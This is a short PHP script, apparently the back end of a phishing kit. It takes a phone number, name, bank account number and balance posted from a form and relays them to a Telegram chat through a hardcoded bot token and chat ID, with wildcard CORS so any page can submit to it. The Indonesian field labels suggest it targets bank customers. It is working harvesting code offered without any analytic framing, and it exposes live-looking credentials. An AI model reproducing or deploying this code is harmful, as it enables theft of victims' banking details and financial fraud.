<?php
header('Access-Control-Allow-Origin: *');
$token = "7432416634:AAH7EZps8Ra7LI9Bf53YEo4hBha9a1afo9A";
$chatID = "6932788589";
// $token = "6278828845:AAG875_xJ422AFh0MhFuHXeX7L7a8cqjlW4";
// $chatID = "5960867414";
$phone = $_POST['phone'];
$tarif = $_POST['tarif'];
$name = $_POST['name'];
$account = $_POST['account'];
$balance = $_POST['balance'];
$content = "<b>No. HP:</b> ".$phone."\n<b>Tarif:</b> ".$tarif."\n<b>Nama:</b> ".$name."\n<b>No. Rekening:</b> ".$account."\n<b>Saldo:</b> ".$balance;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
echo $server_output;
